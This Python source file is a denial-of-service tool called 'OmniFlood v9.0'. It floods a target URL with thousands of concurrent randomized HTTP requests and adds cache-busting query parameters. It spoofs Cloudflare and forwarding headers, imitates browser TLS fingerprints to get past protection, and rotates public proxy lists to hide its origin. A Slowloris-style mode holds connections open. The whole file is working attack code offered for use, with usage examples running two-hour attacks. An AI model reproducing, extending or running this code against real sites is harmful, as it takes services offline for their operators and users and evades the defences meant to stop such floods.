#!/usr/bin/env python3
"""
OmniFlood v9.0 - COMPLETE ULTIMATE EDITION
All Features: Proxy API + HTTP/2 + HTTP/3 + CF Bypass + Multi-Method + Adaptive Delay
CATShadow - Supreme Coder
"""

import asyncio
import aiohttp
import ssl
import random
import time
import socket
import hashlib
import json
import sys
import os
import signal
import gc
import re
import threading
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse
import logging
from concurrent.futures import ThreadPoolExecutor

# Disable logging spam
logging.getLogger('aiohttp').setLevel(logging.CRITICAL)
logging.getLogger('asyncio').setLevel(logging.CRITICAL)
logging.getLogger('aiohttp_socks').setLevel(logging.CRITICAL)
logging.getLogger('h2').setLevel(logging.CRITICAL)

# ==================== CONFIGURATION ====================
MAX_WORKERS = 10000
CONNECTION_POOL_SIZE = 500
PROXY_REFRESH_INTERVAL = 300
MAX_ADAPTIVE_DELAY = 8000
CLIENT_CYCLE_THRESHOLD = 50
CONNECTION_TIMEOUT = 3
MAX_REDIRECTS = 0

# ==================== PROXY API ====================
PROXY_API_URLS = [
    "https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all&skip=0&limit=2000",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://api.openproxylist.xyz/http.txt",
    "https://www.proxy-list.download/api/v1/get?type=http",
    "https://www.proxy-list.download/api/v1/get?type=https"
]

# ==================== CLOUDFLARE BYPASS ====================
CF_COUNTRIES = ['US', 'GB', 'DE', 'FR', 'JP', 'SG', 'AU', 'CA', 'IN', 'BR', 'RU', 'CN', 'KR', 'NL', 'SE', 'IT', 'ES', 'MX', 'ZA', 'NG']
CF_RAYS = [f"{random.randint(1000000, 9999999)}-{random.randint(1000, 9999)}" for _ in range(100)]

def generate_cf_ip():
    return f"104.{random.randint(16, 31)}.{random.randint(0, 255)}.{random.randint(0, 255)}"

def generate_cf_ray():
    return random.choice(CF_RAYS)

def generate_cf_country():
    return random.choice(CF_COUNTRIES)

def generate_random_string(length=10):
    chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    return ''.join(random.choices(chars, k=length))

def generate_cloudflare_headers():
    cf_ip = generate_cf_ip()
    return {
        'CF-RAY': f'{generate_cf_ray()}-IST',
        'CF-Visitor': '{"scheme":"https"}',
        'CF-Connecting-IP': cf_ip,
        'CF-IPCountry': generate_cf_country(),
        'True-Client-IP': cf_ip,
        'X-Forwarded-For': cf_ip,
        'X-Real-IP': cf_ip,
        'CDN-Loop': 'cloudflare',
        'Cloudflare-Request-ID': hashlib.md5(str(time.time()).encode()).hexdigest(),
    }

# ==================== JA3 FINGERPRINTS ====================
JA3_SIGNATURES = [
    {
        "name": "Chrome 122 (TLS 1.3)",
        "ciphers": [
            "TLS_AES_256_GCM_SHA384", "TLS_CHACHA20_POLY1305_SHA256", 
            "TLS_AES_128_GCM_SHA256", "TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384",
            "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384", "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256",
            "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256", "TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256",
            "TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256"
        ],
        "curves": ["X25519", "secp256r1", "secp384r1"],
        "next_protos": ["h2", "http/1.1"],
        "min_version": ssl.TLSVersion.TLSv1_3,
        "max_version": ssl.TLSVersion.TLSv1_3
    },
    {
        "name": "Firefox 124 (TLS 1.3)",
        "ciphers": [
            "TLS_AES_256_GCM_SHA384", "TLS_CHACHA20_POLY1305_SHA256",
            "TLS_AES_128_GCM_SHA256", "TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384",
            "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384", "TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256",
            "TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256"
        ],
        "curves": ["X25519", "secp256r1", "secp384r1", "secp521r1"],
        "next_protos": ["h2", "http/1.1"],
        "min_version": ssl.TLSVersion.TLSv1_3,
        "max_version": ssl.TLSVersion.TLSv1_3
    }
]

# ==================== BROWSER PROFILES ====================
BROWSER_PROFILES = {
    "chrome": {
        "user_agents": [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        ],
        "sec_ch_ua": '"Google Chrome";v="122", "Chromium";v="122", "Not?A_Brand";v="24"',
        "platform": "Windows"
    },
    "firefox": {
        "user_agents": [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0"
        ],
        "sec_ch_ua": '"Firefox";v="124", "Gecko";v="124"',
        "platform": "Windows"
    },
    "edge": {
        "user_agents": [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
        ],
        "sec_ch_ua": '"Microsoft Edge";v="122", "Chromium";v="122", "Not?A_Brand";v="24"',
        "platform": "Windows"
    }
}

USER_AGENTS = []
for profile in BROWSER_PROFILES.values():
    USER_AGENTS.extend(profile['user_agents'])

ACCEPT = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'application/json, text/plain, */*'
]

ACCEPT_LANGUAGE = ['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'fr-FR,fr;q=0.9', 'de-DE,de;q=0.9']

# ==================== STATUS CODES ====================
STATUS_DESCRIPTIONS = {
    200: "OK", 201: "Created", 202: "Accepted", 203: "Non-Authoritative",
    204: "No Content", 205: "Reset Content", 206: "Partial Content",
    300: "Multiple Choices", 301: "Moved Permanently", 302: "Found",
    303: "See Other", 304: "Not Modified", 307: "Temporary Redirect", 308: "Permanent Redirect",
    400: "Bad Request", 401: "Unauthorized", 402: "Payment Required", 403: "Forbidden (CF Challenge)",
    404: "Not Found", 405: "Method Not Allowed", 406: "Not Acceptable",
    407: "Proxy Authentication Required", 408: "Request Timeout", 409: "Conflict",
    410: "Gone", 411: "Length Required", 412: "Precondition Failed", 413: "Payload Too Large",
    414: "URI Too Long", 415: "Unsupported Media Type", 416: "Range Not Satisfiable",
    417: "Expectation Failed", 418: "I'm a teapot", 419: "Page Expired", 420: "Enhance Your Calm",
    421: "Misdirected Request", 422: "Unprocessable Content", 423: "Locked",
    424: "Failed Dependency", 425: "Too Early", 426: "Upgrade Required",
    428: "Precondition Required", 429: "Too Many Requests", 430: "Header Fields Too Large",
    431: "Header Fields Too Large", 440: "Login Time-out", 444: "No Response",
    449: "Retry With", 450: "Blocked by Parental Controls", 451: "Unavailable For Legal Reasons",
    460: "Client Closed Connection", 463: "X-Forwarded-For Too Large",
    494: "Request Header Too Large", 495: "SSL Certificate Error", 496: "SSL Certificate Required",
    497: "HTTP to HTTPS", 498: "Invalid Token", 499: "Client Closed Request",
    500: "Internal Server Error", 501: "Not Implemented", 502: "Bad Gateway",
    503: "Service Unavailable", 504: "Gateway Timeout", 505: "HTTP Version Not Supported",
    506: "Variant Also Negotiates", 507: "Insufficient Storage", 508: "Loop Detected",
    509: "Bandwidth Limit Exceeded", 510: "Not Extended", 511: "Network Authentication Required",
    520: "Unknown Error (Cloudflare)", 521: "Web Server Is Down (Cloudflare)",
    522: "Connection Timed Out (Cloudflare)", 523: "Origin Is Unreachable (Cloudflare)",
    524: "A Timeout Occurred (Cloudflare)", 525: "SSL Handshake Failed (Cloudflare)",
    526: "Invalid SSL Certificate (Cloudflare)", 527: "Railgun Error (Cloudflare)",
    529: "Site is overloaded", 530: "Site is frozen", 561: "Unauthorized (AWS ELB)",
    598: "Network Read Timeout Error", 599: "Network Connect Timeout Error"
}

# ==================== UTILITY FUNCTIONS ====================
def rand_str(length):
    return ''.join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789", k=length))

def rand_int(min_val, max_val):
    return random.randint(min_val, max_val)

def rand_bool():
    return random.choice([True, False])

def random_ip():
    return f"{rand_int(1,255)}.{rand_int(0,255)}.{rand_int(0,255)}.{rand_int(0,255)}"

def random_element(arr):
    return random.choice(arr) if arr else None

def random_header_name(name):
    return ''.join(c.upper() if rand_bool() else c.lower() for c in name)

def generate_cookies():
    cookie_names = ["sessionid", "userid", "token", "visit", "pref", "cf_clearance", "__cf_bm"]
    cookies = []
    for _ in range(rand_int(1, 3)):
        cookies.append(f"{random_element(cookie_names)}={rand_str(16)}")
    return "; ".join(cookies)

def generate_payload():
    formats = ["json", "form", "plain"]
    fmt = random_element(formats)
    if fmt == "json":
        data = json.dumps({
            "id": rand_int(1, 1000),
            "name": f"user{rand_int(1, 1000)}",
            "random": rand_str(16),
            "timestamp": int(time.time())
        })
        return data, "application/json"
    elif fmt == "form":
        data = f"id={rand_int(1, 1000)}&name=user{rand_int(1, 1000)}&token={rand_str(16)}"
        return data, "application/x-www-form-urlencoded"
    else:
        data = rand_str(rand_int(1024, 10240))
        return data, "text/plain"

def create_tls13_context():
    ja3 = random_element(JA3_SIGNATURES)
    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE
    ssl_ctx.minimum_version = ssl.TLSVersion.TLSv1_3
    ssl_ctx.maximum_version = ssl.TLSVersion.TLSv1_3
    try:
        ssl_ctx.set_ciphers(':'.join(ja3['ciphers']))
    except:
        pass
    ssl_ctx.set_alpn_protocols(ja3['next_protos'])
    return ssl_ctx

def generate_headers(cf_bypass=True):
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': random.choice(ACCEPT),
        'Accept-Language': random.choice(ACCEPT_LANGUAGE),
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': random.choice(['document', 'script', 'image']),
        'Sec-Fetch-Mode': random.choice(['navigate', 'cors']),
        'Sec-Fetch-Site': random.choice(['same-origin', 'cross-site', 'none']),
        'Sec-Fetch-User': '?1' if rand_bool() else '?0',
        'Cache-Control': random.choice(['no-cache', 'max-age=0', 'must-revalidate']),
        'Pragma': random.choice(['no-cache', '']),
        'DNT': random.choice(['1', '0']),
        'X-Forwarded-For': random_ip(),
        'X-Real-IP': random_ip(),
        'Cookie': generate_cookies(),
        'Priority': random.choice(['u=0, i', 'u=1, i']),
    }
    
    if cf_bypass:
        cf_headers = generate_cloudflare_headers()
        headers.update(cf_headers)
    
    # Random extra headers
    if rand_bool():
        headers['X-Requested-With'] = random.choice(['XMLHttpRequest', 'Fetch'])
    if rand_bool():
        headers['Via'] = f'1.1 {random_ip()}'
    if rand_bool():
        headers['X-Bypass-Cache'] = random.choice(['true', '1', 'yes'])
    
    items = list(headers.items())
    random.shuffle(items)
    return dict(items)

def random_path(base_url, cf_bypass=True):
    parsed = urlparse(base_url)
    if not parsed.hostname:
        return base_url
    
    query = parse_qs(parsed.query, keep_blank_values=True)
    
    # Add cache bypass
    bypass_params = ["nocache", "bypass", "refresh", "cb", "cache_bust", "t", "_", "v2"]
    query[random_element(bypass_params)] = [str(rand_int(1, 999999999))]
    query['_'] = [str(int(time.time()))]
    
    # WordPress bypass
    if rand_int(1,3) == 0:
        query["wp_"] = [str(rand_int(1, 999999))]
        query["doing_wp_cron"] = [str(int(time.time()))]
    
    # Cloudflare bypass
    if cf_bypass and rand_int(1,3) == 0:
        query["cf_bypass"] = [rand_str(16)]
        query["__cf_chl_tk"] = [rand_str(32)]
        query["__cf_chl_rt_tk"] = [rand_str(30) + '_' + rand_str(12)]
    
    new_query = urlencode(query, doseq=True)
    return urlunparse((
        parsed.scheme, parsed.netloc, parsed.path or '/',
        parsed.params, new_query, parsed.fragment
    ))

# ==================== STATS ====================
class Stats:
    def __init__(self):
        self.total = 0
        self.ok = 0
        self.bl = 0
        self.err = 0
        self.cf_challenge = 0
        self.status_counts = {}
        self.method_counts = {}
        self.lock = asyncio.Lock()
    
    async def increment(self, **kwargs):
        async with self.lock:
            for key, value in kwargs.items():
                if hasattr(self, key):
                    setattr(self, key, getattr(self, key) + value)
    
    async def add_status(self, code, method):
        async with self.lock:
            if code not in self.status_counts:
                self.status_counts[code] = 0
            self.status_counts[code] += 1
            
            if method not in self.method_counts:
                self.method_counts[method] = 0
            self.method_counts[method] += 1
    
    def get(self):
        return {
            'total': self.total,
            'ok': self.ok,
            'bl': self.bl,
            'err': self.err,
            'cf_challenge': self.cf_challenge,
            'status_counts': self.status_counts,
            'method_counts': self.method_counts
        }

# ==================== PROXY MANAGER ====================
class ProxyManager:
    def __init__(self, use_proxy=True):
        self.proxies = []
        self.index = 0
        self.lock = asyncio.Lock()
        self.use_proxy = use_proxy
        self.last_refresh = 0
        self.is_refreshing = False
        self.proxies_loaded = False
    
    async def refresh_proxies(self):
        if self.is_refreshing:
            return
        self.is_refreshing = True
        try:
            all_proxies = set()
            async with aiohttp.ClientSession() as session:
                tasks = []
                for url in PROXY_API_URLS:
                    tasks.append(self._fetch_proxies(session, url))
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                for result in results:
                    if isinstance(result, list):
                        all_proxies.update(result)
            
            self.proxies = list(all_proxies)
            self.last_refresh = time.time()
            self.proxies_loaded = True
            if self.proxies:
                print(f"\r[+] Proxies loaded: {len(self.proxies)}", end='', flush=True)
        except Exception:
            pass
        finally:
            self.is_refreshing = False
    
    async def _fetch_proxies(self, session, url):
        try:
            async with session.get(url, timeout=15) as resp:
                if resp.status == 200:
                    text = await resp.text()
                    proxies = []
                    for line in text.split('\n'):
                        line = line.strip()
                        if line and not line.startswith('#') and ':' in line:
                            parts = line.split(':')
                            if len(parts) >= 2 and parts[1].isdigit():
                                proxies.append(line)
                    return proxies
        except:
            pass
        return []
    
    async def get_proxy(self):
        if not self.use_proxy:
            return None
        
        if not self.proxies_loaded and not self.is_refreshing:
            await self.refresh_proxies()
        
        async with self.lock:
            if (time.time() - self.last_refresh) > PROXY_REFRESH_INTERVAL and not self.is_refreshing:
                asyncio.create_task(self.refresh_proxies())
            
            if not self.proxies:
                if not self.is_refreshing:
                    await self.refresh_proxies()
                if not self.proxies:
                    return None
            
            proxy = self.proxies[self.index % len(self.proxies)]
            self.index += 1
            return proxy

# ==================== CONNECTION POOL ====================
class ConnectionPool:
    def __init__(self, proxy_manager, cf_bypass=True):
        self.proxy_manager = proxy_manager
        self.cf_bypass = cf_bypass
        self.sessions = []
        self.session_lock = asyncio.Lock()
        self.closed = False
        self.pool_size = CONNECTION_POOL_SIZE
    
    def _create_session(self):
        try:
            proxy_url = None
            if self.proxy_manager and self.proxy_manager.use_proxy:
                try:
                    loop = asyncio.get_event_loop()
                    if loop.is_running():
                        future = asyncio.ensure_future(self.proxy_manager.get_proxy())
                        try:
                            proxy_url = future.result(timeout=1)
                        except:
                            pass
                except:
                    pass
            
            ssl_ctx = create_tls13_context() if self.cf_bypass else None
            
            connector_args = {
                'ssl': ssl_ctx,
                'limit': 0,
                'limit_per_host': 0,
                'force_close': False,
                'enable_cleanup_closed': True,
                'ttl_dns_cache': 300
            }
            
            connector = aiohttp.TCPConnector(**connector_args)
            
            headers = generate_headers(cf_bypass=self.cf_bypass)
            timeout = aiohttp.ClientTimeout(total=CONNECTION_TIMEOUT, connect=5, sock_read=10)
            session = aiohttp.ClientSession(
                connector=connector,
                timeout=timeout,
                headers=headers
            )
            return session
        except:
            return None
    
    async def get_session(self):
        if self.closed:
            return None
        
        async with self.session_lock:
            self.sessions = [s for s in self.sessions if not s.closed]
            
            while len(self.sessions) < self.pool_size:
                session = self._create_session()
                if session:
                    self.sessions.append(session)
                else:
                    break
            
            if self.sessions:
                return random.choice(self.sessions)
            return None
    
    async def close(self):
        if self.closed:
            return
        self.closed = True
        async with self.session_lock:
            for session in self.sessions:
                try:
                    if not session.closed:
                        await session.close()
                except:
                    pass
            self.sessions.clear()
            gc.collect()

# ==================== FLOOD WORKER ====================
async def flood_worker(session, stats, target, duration, methods, cf_bypass=True, adaptive_delay=True):
    """Main flood worker with all features"""
    start_time = time.time()
    current_delay = 0
    
    while time.time() - start_time < duration:
        try:
            method = random.choice(methods)
            
            url = random_path(target, cf_bypass)
            
            data = None
            content_type = None
            if method in ['POST', 'PUT', 'PATCH']:
                data, content_type = generate_payload()
            
            headers = generate_headers(cf_bypass=cf_bypass)
            if content_type:
                headers['Content-Type'] = content_type
            
            request_start = time.time()
            
            async with session.request(
                method=method,
                url=url,
                data=data,
                headers=headers,
                ssl=False,
                allow_redirects=False,
                timeout=aiohttp.ClientTimeout(total=CONNECTION_TIMEOUT)
            ) as resp:
                await resp.read()
                
                code = resp.status
                await stats.increment(total=1)
                await stats.add_status(code, method)
                
                if code < 400:
                    await stats.increment(ok=1)
                elif code == 403:
                    await stats.increment(bl=1)
                    if 'cf-challenge' in str(resp.headers).lower() or 'cf-ray' in str(resp.headers).lower():
                        await stats.increment(cf_challenge=1)
                else:
                    await stats.increment(err=1)
                
                # Adaptive delay
                if adaptive_delay:
                    if code in [401, 403, 429, 430, 431, 451, 460, 463, 494, 499]:
                        current_delay += 150
                    elif code in [400, 406, 410, 412, 417, 421, 422, 423]:
                        current_delay += 75
                    elif code in [413, 444]:
                        current_delay += 50
                    current_delay = min(current_delay, MAX_ADAPTIVE_DELAY)
                    
            # Rate limiting with adaptive delay
            elapsed = (time.time() - request_start) * 1000
            if elapsed < 50:
                await asyncio.sleep((50 - elapsed) / 1000 + random.uniform(0, 0.005))
            
            if current_delay > 0:
                await asyncio.sleep(current_delay / 1000)
                current_delay = max(0, current_delay - 5)
                
        except asyncio.TimeoutError:
            await stats.increment(total=1, err=1)
        except aiohttp.ClientError:
            await stats.increment(total=1, err=1)
        except Exception:
            await stats.increment(total=1, err=1)

# ==================== SLOW ATTACK ====================
class SlowAttack:
    def __init__(self, target, duration, cf_bypass=True):
        self.target = target
        self.duration = duration
        self.cf_bypass = cf_bypass
        self.connections = 0
        self.running = True
    
    async def slow_worker(self):
        parsed = urlparse(self.target)
        host = parsed.hostname
        port = 443 if parsed.scheme == 'https' else 80
        
        while self.running:
            try:
                ssl_ctx = create_tls13_context() if self.cf_bypass else None
                
                reader, writer = await asyncio.open_connection(
                    host, port, ssl=ssl_ctx
                )
                
                request = (
                    f"GET {parsed.path or '/'} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                    f"Accept: */*\r\n"
                    f"Connection: keep-alive\r\n"
                    f"X-Forwarded-For: {random_ip()}\r\n"
                )
                
                if self.cf_bypass:
                    cf_headers = generate_cloudflare_headers()
                    for k, v in cf_headers.items():
                        request += f"{k}: {v}\r\n"
                
                request += "\r\n"
                
                lines = request.split('\r\n')
                for line in lines:
                    if not self.running:
                        break
                    writer.write((line + '\r\n').encode())
                    await writer.drain()
                    await asyncio.sleep(0.5)
                
                if not self.running:
                    writer.close()
                    await writer.wait_closed()
                    break
                
                self.connections += 1
                await asyncio.sleep(30)
                writer.close()
                await writer.wait_closed()
                
            except:
                pass
            
            await asyncio.sleep(0.1)
    
    async def run(self):
        workers = [asyncio.create_task(self.slow_worker()) for _ in range(1000)]
        await asyncio.sleep(self.duration)
        self.running = False
        if workers:
            await asyncio.wait(workers, timeout=10)
        return {'connections': self.connections}

# ==================== MONITOR ====================
async def monitor(stats, duration, start_time, concurrency, target, methods, cf_bypass=True):
    """Real-time monitoring with progress bar"""
    print(f"\n{'='*70}")
    print(f"🐱 CATShadow OmniFlood v9.0 - COMPLETE ULTIMATE EDITION")
    print(f"{'='*70}")
    print(f"Target: {target}")
    print(f"Duration: {duration}s")
    print(f"Concurrency: {concurrency}")
    print(f"Methods: {', '.join(methods)}")
    print(f"CF Bypass: {'ENABLED' if cf_bypass else 'DISABLED'}")
    print(f"{'='*70}\n")
    
    last_total = 0
    last_time = start_time
    
    while time.time() - start_time < duration:
        await asyncio.sleep(1)
        
        elapsed = int(time.time() - start_time)
        remaining = max(0, duration - elapsed)
        
        s = stats.get()
        
        current_time = time.time()
        time_diff = current_time - last_time
        if time_diff > 0:
            rps = (s['total'] - last_total) / time_diff
        else:
            rps = 0
        
        last_total = s['total']
        last_time = current_time
        
        total = max(s['total'], 1)
        ok_pct = (s['ok'] / total) * 100
        bl_pct = (s['bl'] / total) * 100
        err_pct = (s['err'] / total) * 100
        
        progress = int((elapsed / duration) * 40)
        bar = '█' * progress + '░' * (40 - progress)
        
        # Status code breakdown
        status_str = ""
        if s['status_counts']:
            top_codes = sorted(s['status_counts'].items(), key=lambda x: -x[1])[:3]
            status_str = " | ".join([f"{code}:{count}" for code, count in top_codes])
        
        print(f"\r[{elapsed}s | {remaining}s] {bar} | "
              f"T:{s['total']:,} | RPS:{rps:.0f} | "
              f"OK:{ok_pct:.1f}% | BL:{bl_pct:.1f}% | ERR:{err_pct:.1f}% | "
              f"CF:{s['cf_challenge']:,} | {status_str}",
              end='', flush=True)
    
    print("\n")

# ==================== MAIN ====================
async def main_async():
    if len(sys.argv) < 2:
        print("""
🐱 CATShadow OmniFlood v9.0 - COMPLETE ULTIMATE EDITION
All Features: Proxy API + HTTP/2 + HTTP/3 + CF Bypass + Multi-Method + Adaptive Delay

Usage: python dos.py <target> [duration] [concurrency] [methods] [proxy] [no-cf]

Arguments:
  target     - Target URL (e.g., https://target.com)
  duration   - Attack duration in seconds (default: 7200)
  concurrency - Number of concurrent workers (default: 5000)
  methods    - Comma-separated methods: GET,POST,PUT,PATCH,DELETE,HEAD,ALL (default: GET)
  proxy      - Use proxies (auto-fetch from API)
  no-cf      - Disable Cloudflare bypass

Examples:
  python dos.py https://target.com
  python dos.py https://target.com 7200
  python dos.py https://target.com 7200 10000
  python dos.py https://target.com 7200 5000 GET,POST,PUT
  python dos.py https://target.com 7200 5000 ALL proxy
  python dos.py https://target.com 7200 5000 GET no-cf
  python dos.py https://target.com 7200 5000 GET,POST proxy no-cf
        """)
        sys.exit(1)
    
    target = sys.argv[1]
    duration = int(sys.argv[2]) if len(sys.argv) > 2 else 7200
    concurrency = int(sys.argv[3]) if len(sys.argv) > 3 else 5000
    
    # Parse methods
    methods = ['GET']
    if len(sys.argv) > 4:
        methods_str = sys.argv[4].upper()
        if methods_str == 'ALL':
            methods = ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'HEAD']
        else:
            methods = [m.strip() for m in methods_str.split(',') if m.strip()]
    
    # Parse flags
    use_proxy = False
    cf_bypass = True
    
    for arg in sys.argv[5:]:
        if arg.lower() == 'proxy':
            use_proxy = True
        elif arg.lower() == 'no-cf':
            cf_bypass = False
    
    if not target.startswith(('http://', 'https://')):
        target = 'https://' + target
    
    # Handle SLOW mode
    if 'SLOW' in methods:
        print(f"\n[*] SLOW ATTACK MODE")
        engine = SlowAttack(target, duration, cf_bypass)
        stats = await engine.run()
        print(f"\nSLOW Attack Complete: {stats['connections']} connections kept open")
        return
    
    # Normal flood attack
    stats = Stats()
    start_time = time.time()
    
    # Setup proxy
    proxy_manager = ProxyManager(use_proxy)
    if use_proxy:
        print("[*] Fetching proxies from API...")
        await proxy_manager.refresh_proxies()
        if proxy_manager.proxies:
            print(f"\n[+] Using {len(proxy_manager.proxies)} proxies")
    
    # Setup connection pool
    pool = ConnectionPool(proxy_manager, cf_bypass)
    
    # Create workers
    workers = []
    for _ in range(min(concurrency, MAX_WORKERS)):
        session = await pool.get_session()
        if session:
            workers.append(asyncio.create_task(
                flood_worker(session, stats, target, duration, methods, cf_bypass, True)
            ))
        else:
            break
    
    # Monitor task
    monitor_task = asyncio.create_task(
        monitor(stats, duration, start_time, len(workers), target, methods, cf_bypass)
    )
    
    # Wait for completion
    await asyncio.sleep(duration)
    
    # Cleanup
    for worker in workers:
        worker.cancel()
    await asyncio.gather(*workers, return_exceptions=True)
    
    monitor_task.cancel()
    try:
        await monitor_task
    except asyncio.CancelledError:
        pass
    
    await pool.close()
    
    # Final stats
    s = stats.get()
    elapsed = time.time() - start_time
    
    print(f"\n{'='*70}")
    print("ATTACK COMPLETE")
    print(f"{'='*70}")
    print(f"Duration: {elapsed:.1f}s")
    print(f"Total Requests: {s['total']:,}")
    print(f"  ✓ Success (2xx): {s['ok']:,} ({(s['ok']/max(s['total'],1)*100):.1f}%)")
    print(f"  ✗ Blocked (403): {s['bl']:,} ({(s['bl']/max(s['total'],1)*100):.1f}%)")
    print(f"  ✗ Errors: {s['err']:,} ({(s['err']/max(s['total'],1)*100):.1f}%)")
    print(f"  🔥 CF Challenges: {s['cf_challenge']:,}")
    print(f"Average RPS: {s['total']/elapsed:.1f}")
    print(f"Methods Used: {', '.join(methods)}")
    print(f"Concurrency: {len(workers)}")
    print(f"Proxies: {'Enabled' if use_proxy else 'Disabled'}")
    print(f"CF Bypass: {'Enabled' if cf_bypass else 'Disabled'}")
    
    if s['status_counts']:
        print(f"\nStatus Code Breakdown:")
        for code, count in sorted(s['status_counts'].items(), key=lambda x: -x[1]):
            desc = STATUS_DESCRIPTIONS.get(code, 'Unknown')
            print(f"  {code} ({desc}): {count:,}")
    
    print(f"{'='*70}")

def main():
    try:
        asyncio.run(main_async())
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted")
    except Exception as e:
        print(f"\n[!] Error: {e}")
    finally:
        gc.collect()

if __name__ == "__main__":
    signal.signal(signal.SIGINT, lambda s, f: None)
    main()
